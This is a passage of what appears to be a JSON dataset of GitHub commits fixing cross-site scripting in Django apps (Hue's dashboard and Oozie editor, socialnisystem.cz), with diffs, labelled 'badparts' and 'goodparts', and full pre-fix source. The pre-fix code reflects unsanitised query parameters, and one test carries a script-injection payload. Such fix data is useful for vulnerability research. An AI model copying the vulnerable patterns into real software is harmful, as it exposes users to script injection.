\n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n"
                }
            },
            "msg": "[oozie] Protect against XSS in the editor"
        },
        "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d": {
            "url": "https://api.github.com/repos/gethue/hue/commits/37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d",
            "html_url": "https://github.com/gethue/hue/commit/37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d",
            "sha": "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d",
            "keyword": "XSS protect",
            "diff": "diff --git a/desktop/libs/dashboard/src/dashboard/tests.py b/desktop/libs/dashboard/src/dashboard/tests.py\nindex e5b063197b..7dbe808570 100644\n--- a/desktop/libs/dashboard/src/dashboard/tests.py\n+++ b/desktop/libs/dashboard/src/dashboard/tests.py\n@@ -507,6 +507,15 @@ def test_download(self):\n     assert_equal('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', xls_response['Content-Type'])\n     assert_equal('attachment; filename=query_result.xlsx', xls_response['Content-Disposition'])\n \n+  def test_index_xss(self):\n+    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,\n+                                   data=json.dumps(self.collection.data), parent_directory=self.home_dir)\n+    try:\n+      response = self.c.get(reverse('dashboard:index') + ('?collection=%s' % doc.id) + '&q=</script><script>alert(%27XSS%27)</script>')\n+      assert_equal('{\"fqs\": [], \"qs\": [{\"q\": \"alert(\\'XSS\\')\"}], \"start\": 0}', response.context['query'])\n+    finally:\n+      doc.delete()\n+\n   def test_augment_response(self):\n     collection = self._get_collection_param(self.collection)\n     query = QUERY\ndiff --git a/desktop/libs/dashboard/src/dashboard/views.py b/desktop/libs/dashboard/src/dashboard/views.py\nindex 85851b7088..c771345591 100644\n--- a/desktop/libs/dashboard/src/dashboard/views.py\n+++ b/desktop/libs/dashboard/src/dashboard/views.py\n@@ -26,6 +26,7 @@\n from desktop.lib.django_util import JsonResponse, render\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.models import Document2, Document\n+from desktop.views import antixss\n \n from search.conf import LATEST\n \n@@ -72,9 +73,9 @@ def index(request, is_mobile=False):\n \n   if request.method == 'GET':\n     if 'q' in request.GET:\n-      query['qs'][0]['q'] = request.GET.get('q')\n+      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))\n     if 'qd' in request.GET:\n-      query['qd'] = request.GET.get('qd')\n+      query['qd'] = antixss(request.GET.get('qd', ''))\n \n   template = 'search.mako'\n   if is_mobile:\n@@ -89,7 +90,7 @@ def index(request, is_mobile=False):\n         'is_latest': LATEST.get(),\n         'engines': get_engines(request.user)\n     }),\n-    'is_owner': collection_doc.doc.get().can_write(request.user),\n+    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),\n     'can_edit_index': can_edit_index(request.user),\n     'is_embeddable': request.GET.get('is_embeddable', False),\n     'mobile': is_mobile,\n",
            "message": "",
            "files": {
                "/desktop/libs/dashboard/src/dashboard/views.py": {
                    "changes": [
                        {
                            "diff": "\n \n   if request.method == 'GET':\n     if 'q' in request.GET:\n-      query['qs'][0]['q'] = request.GET.get('q')\n+      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))\n     if 'qd' in request.GET:\n-      query['qd'] = request.GET.get('qd')\n+      query['qd'] = antixss(request.GET.get('qd', ''))\n \n   template = 'search.mako'\n   if is_mobile:\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/desktop/libs/dashboard/src/dashboard/views.py",
                            "badparts": [
                                "      query['qs'][0]['q'] = request.GET.get('q')",
                                "      query['qd'] = request.GET.get('qd')"
                            ],
                            "goodparts": [
                                "      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))",
                                "      query['qd'] = antixss(request.GET.get('qd', ''))"
                            ]
                        },
                        {
                            "diff": "\n         'is_latest': LATEST.get(),\n         'engines': get_engines(request.user)\n     }),\n-    'is_owner': collection_doc.doc.get().can_write(request.user),\n+    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),\n     'can_edit_index': can_edit_index(request.user),\n     'is_embeddable': request.GET.get('is_embeddable', False),\n     'mobile': is_mobile,\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/desktop/libs/dashboard/src/dashboard/views.py",
                            "badparts": [
                                "    'is_owner': collection_doc.doc.get().can_write(request.user),"
                            ],
                            "goodparts": [
                                "    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),"
                            ]
                        }
                    ],
                    "source": "\n import json import logging from django.utils.html import escape from django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop.models import Document2, Document from search.conf import LATEST from dashboard.dashboard_api import get_engine from dashboard.decorators import allow_owner_only from dashboard.models import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController, can_edit_index LOG=logging.getLogger(__name__) DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections() collection_id=request.GET.get('collection') if not hue_collections or not collection_id: return admin_collections(request, True, is_mobile) try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps({ 'collections':[], 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': collection_doc.doc.get().can_write(request.user), 'can_edit_index': can_edit_index(request.user), 'is_embeddable': request.GET.get('is_embeddable', False), 'mobile': is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request.user, name=name, engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template']['extracode']) if collection: if collection['id']: dashboard_doc=Document2.objects.get(id=collection['id']) else: dashboard_doc=Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard') dashboard_doc.update_data({ 'collection': collection, 'layout': layout }) dashboard_doc1=dashboard_doc.doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']=0 response['id']=dashboard_doc.id response['message']=_('Page saved !') else: response['message']=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def admin_collections(request, is_redirect=False, is_mobile=False): existing_hue_collections=DashboardController(request.user).get_search_collections() if request.GET.get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False), 'existing_hue_collections': existing_hue_collections, 'is_redirect': is_redirect }) def admin_collection_delete(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections([collection['id'] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.copy_collections([collection['id'] for collection in collections]) } return JsonResponse(response) ",
                    "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\n\nfrom django.utils.html import escape\nfrom django.utils.translation import ugettext as _\n\nfrom django.core.urlresolvers import reverse\nfrom desktop.conf import USE_NEW_EDITOR\nfrom desktop.lib.django_util import JsonResponse, render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.models import Document2, Document\n\nfrom search.conf import LATEST\n\nfrom dashboard.dashboard_api import get_engine\nfrom dashboard.decorators import allow_owner_only\nfrom dashboard.models import Collection2\nfrom dashboard.conf import get_engines\nfrom dashboard.controller import DashboardController, can_edit_index\n\n\nLOG = logging.getLogger(__name__)\n\n\nDEFAULT_LAYOUT = [\n     {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"},\n     {\"size\":10,\"rows\":[{\"widgets\":[\n         {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]},\n                        {\"widgets\":[\n         {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n        \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"},\n]\n\n\ndef index(request, is_mobile=False):\n  hue_collections = DashboardController(request.user).get_search_collections()\n  collection_id = request.GET.get('collection')\n\n  if not hue_collections or not collection_id:\n    return admin_collections(request, True, is_mobile)\n\n  try:\n    collection_doc = Document2.objects.get(id=collection_id)\n    if USE_NEW_EDITOR.get():\n      collection_doc.can_read_or_exception(request.user)\n    else:\n      collection_doc.doc.get().can_read_or_exception(request.user)\n    collection = Collection2(request.user, document=collection_doc)\n  except Exception, e:\n    raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\"))\n\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.method == 'GET':\n    if 'q' in request.GET:\n      query['qs'][0]['q'] = request.GET.get('q')\n    if 'qd' in request.GET:\n      query['qd'] = request.GET.get('qd')\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': json.dumps(query),\n    'initial': json.dumps({\n        'collections': [],\n        'layout': DEFAULT_LAYOUT,\n        'is_latest': LATEST.get(),\n        'engines': get_engines(request.user)\n    }),\n    'is_owner': collection_doc.doc.get().can_write(request.user),\n    'can_edit_index': can_edit_index(request.user),\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'mobile': is_mobile,\n  })\n\ndef index_m(request):\n  return index(request, True)\n\ndef new_search(request):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections:\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=collections[0], engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.GET.get('format', 'plain') == 'json':\n    return JsonResponse({\n      'collection': collection.get_props(request.user),\n      'query': query,\n      'initial': {\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }\n     })\n  else:\n    return render('search.mako', request, {\n      'collection': collection,\n      'query': query,\n      'initial': json.dumps({\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }),\n      'is_owner': True,\n      'is_embeddable': request.GET.get('is_embeddable', False),\n      'can_edit_index': can_edit_index(request.user)\n    })\n\ndef browse(request, name, is_mobile=False):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections and engine == 'solr':\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=name, engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': query,\n    'initial': json.dumps({\n      'autoLoad': True,\n      'collections': collections,\n      'layout': [\n          {\"size\":12,\"rows\":[{\"widgets\":[\n              {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\",\n               \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n          \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}\n      ],\n      'is_latest': LATEST.get(),\n      'engines': get_engines(request.user)\n    }),\n    'is_owner': True,\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'can_edit_index': can_edit_index(request.user),\n    'mobile': is_mobile\n  })\n\n\ndef browse_m(request, name):\n  return browse(request, name, True)\n\n\n@allow_owner_only\ndef save(request):\n  response = {'status': -1}\n\n  collection = json.loads(request.POST.get('collection', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  collection['template']['extracode'] = escape(collection['template']['extracode'])\n\n  if collection:\n    if collection['id']:\n      dashboard_doc = Document2.objects.get(id=collection['id'])\n    else:\n      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])\n      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')\n\n    dashboard_doc.update_data({\n        'collection': collection,\n        'layout': layout\n    })\n    dashboard_doc1 = dashboard_doc.doc.get()\n    dashboard_doc.name = dashboard_doc1.name = collection['label']\n    dashboard_doc.description = dashboard_doc1.description = collection['description']\n    dashboard_doc.save()\n    dashboard_doc1.save()\n\n    response['status'] = 0\n    response['id'] = dashboard_doc.id\n    response['message'] = _('Page saved !')\n  else:\n    response['message'] = _('There is no collection to search.')\n\n  return JsonResponse(response)\n\n\ndef no_collections(request):\n  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})\n\n\ndef admin_collections(request, is_redirect=False, is_mobile=False):\n  existing_hue_collections = DashboardController(request.user).get_search_collections()\n\n  if request.GET.get('format') == 'json':\n    collections = []\n    for collection in existing_hue_collections:\n      massaged_collection = collection.to_dict()\n      if request.GET.get('is_mobile'):\n        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id\n      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)\n      collections.append(massaged_collection)\n    return JsonResponse(collections, safe=False)\n\n  template = 'admin_collections.mako'\n  if is_mobile:\n    template = 'admin_collections_m.mako'\n\n  return render(template, request, {\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'existing_hue_collections': existing_hue_collections,\n    'is_redirect': is_redirect\n  })\n\n\ndef admin_collection_delete(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.delete_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n\n\ndef admin_collection_copy(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.copy_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n"
                }
            },
            "msg": "HUE-6856 [search] Protect against reflected XSS in search query parameters"
        }
    },
    "https://github.com/pirati-web/socialnisystem.cz": {
        "1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53": {
            "url": "https://api.github.com/repos/pirati-web/socialnisystem.cz/commits/1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53",
            "html_url": "https://github.com/pirati-web/socialnisystem.cz/commit/1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53",
            "message": "Prevent XSS in ?back attr",
            "sha": "1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53",
            "keyword": "XSS prevent",
            "diff": "diff --git a/socialsystem/core/views.py b/socialsystem/core/views.py\nindex 93a4049..de40fcf 100644\n--- a/socialsystem/core/views.py\n+++ b/socialsystem/core/views.py\n@@ -1,3 +1,5 @@\n+import urllib\n+\n from django.views.generic import TemplateView, FormView, DetailView\n from django.urls import reverse\n \n@@ -64,7 +66,11 @@ class BenefitDetailView(DetailView):\n     def get_context_data(self, *args, **kwargs):\n         data = super().get_context_data(*args, **kwargs)\n \n-        if self.request.GET.get('back', None) is not None:\n-            data['back_link'] = self.request.GET['back']\n+        back = self.request.GET.get('back', None)\n+        parsed_back_url = urllib.parse.urlparse(back)\n+\n+        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS\n+        if back is not None and parsed_back_url.scheme == \"\":\n+            data['back_link'] = back\n \n         return data\n",
            "files": {
                "/socialsystem/core/views.py": {
                    "changes": [
                        {
                            "diff": "\n     def get_context_data(self, *args, **kwargs):\n         data = super().get_context_data(*args, **kwargs)\n \n-        if self.request.GET.get('back', None) is not None:\n-            data['back_link'] = self.request.GET['back']\n+        back = self.request.GET.get('back', None)\n+        parsed_back_url = urllib.parse.urlparse(back)\n+\n+        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS\n+        if back is not None and parsed_back_url.scheme == \"\":\n+            data['back_link'] = back\n \n         return data\n",
                            "add": 6,
                            "remove": 2,
                            "filename": "/socialsystem/core/views.py",
                            "badparts": [
                                "        if self.request.GET.get('back', None) is not None:",
                                "            data['back_link'] = self.request.GET['back']"
                            ],
                            "goodparts": [
                                "        back = self.request.GET.get('back', None)",
                                "        parsed_back_url = urllib.parse.urlparse(back)",
                                "        if back is not None and parsed_back_url.scheme == \"\":",
                                "            data['back_link'] = back"
                            ]
                        }
                    ],
                    "source": "\nfrom django.views.generic import TemplateView, FormView, DetailView from django.urls import reverse from.entryform import EntryForm, entry_form_config, build_question_flag from.models import LifeCondition, Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, **kwargs): kwargs=super().get_form_kwargs() kwargs['entry_form_config']=entry_form_config question_ids={str(q['id']) for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question))) return self.render_to_response({ 'form': form, 'submitted': True, 'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs): data=super().get_context_data(*args, **kwargs) if self.request.GET.get('back', None) is not None: data['back_link']=self.request.GET['back'] return data ",
                    "sourceWithComments": "from django.views.generic import TemplateView, FormView, DetailView\nfrom django.urls import reverse\n\nfrom .entryform import EntryForm, entry_form_config, build_question_flag\nfrom .models import LifeCondition, Benefit, BenefitRequirement\n\n\nclass BenefitOverview(TemplateView):\n    template_name = 'core/benefit_overview.html'\n\n    def get_context_data(self):\n        data = super().get_context_data()\n        data['life_conditions'] = LifeCondition.objects.with_benefits()\n        return data\n\n\nclass BenefitClaimView(FormView):\n    template_name = 'core/benefit_claim.html'\n    form_class = EntryForm\n\n    def get(self, request, *args, **kwargs):\n        form = self.get_form()\n\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.render_to_response(self.get_context_data())\n\n    def get_form_kwargs(self, *args, **kwargs):\n        kwargs = super().get_form_kwargs()\n        kwargs['entry_form_config'] = entry_form_config\n\n        question_ids = {str(q['id']) for q in entry_form_config}\n        data = {\n            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids\n        }\n\n        if data:\n            kwargs['data'] = data\n\n        return kwargs\n\n    def form_valid(self, form):\n        selected_flags = []\n\n        # Assemble query\n        for question in entry_form_config:\n            flag = form.cleaned_data.get(str(question['id']), False)\n\n            if flag:\n                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))\n\n        return self.render_to_response({\n            'form': form,\n            'submitted': True,\n            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),\n        })\n\n\nclass BenefitDetailView(DetailView):\n    model = Benefit\n    template_name = 'core/benefit_detail.html'\n\n    def get_context_data(self, *args, **kwargs):\n        data = super().get_context_data(*args, **kwargs)\n\n        if self.request.GET.get('back', None) is not None:\n            data['back_link'] = self.request.GET['back']\n\n        return data\n"
                }
            },
